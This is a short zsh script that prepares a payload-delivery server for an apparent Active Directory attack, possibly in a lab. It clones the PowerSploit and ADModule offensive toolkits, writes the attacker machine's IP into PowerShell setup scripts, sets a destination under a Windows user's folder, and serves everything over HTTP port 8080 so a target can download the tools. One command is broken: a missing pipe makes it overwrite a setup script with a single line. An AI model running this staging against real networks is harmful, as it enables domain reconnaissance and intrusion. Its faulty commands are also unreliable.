#!/bin/zsh

git clone https://github.com/PowerShellMafia/PowerSploit.git
addr=`/sbin/ifconfig eth0 | grep "inet " | cut -d: -f2 | awk '{print $2}'`
echo "\$urlGet = $addr" | cat - setup-powerview.ps1 > tmp.txt && mv tmp.txt setup-powerview.ps1

git clone https://github.com/samratashok/ADModule
echo "\$urlGet = $addr" | cat - setup-admodule.ps1 > tmp.txt && mv tmp.txt setup-admodule.ps1
echo '$destGet = C:\\Users\\robb.stark\\test' cat - setup-admodule.ps1 > tmp.txt && mv tmp.txt setup-admodule.ps1

python3 -m http.server 8080